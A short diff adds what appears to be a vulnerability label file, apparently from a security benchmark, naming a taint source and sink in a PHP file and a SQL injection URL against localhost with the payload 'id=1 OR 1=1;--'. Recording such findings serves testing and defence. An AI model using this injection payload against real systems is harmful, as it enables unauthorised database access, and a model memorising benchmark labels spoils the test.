@@ -1,0 +1,5 @@
+source vuln.php:api_object.php:14
+sink countries_api_object:30
+
+exploit http://localhost:9000/vuln.php?id=1%20OR%201=1;--
+
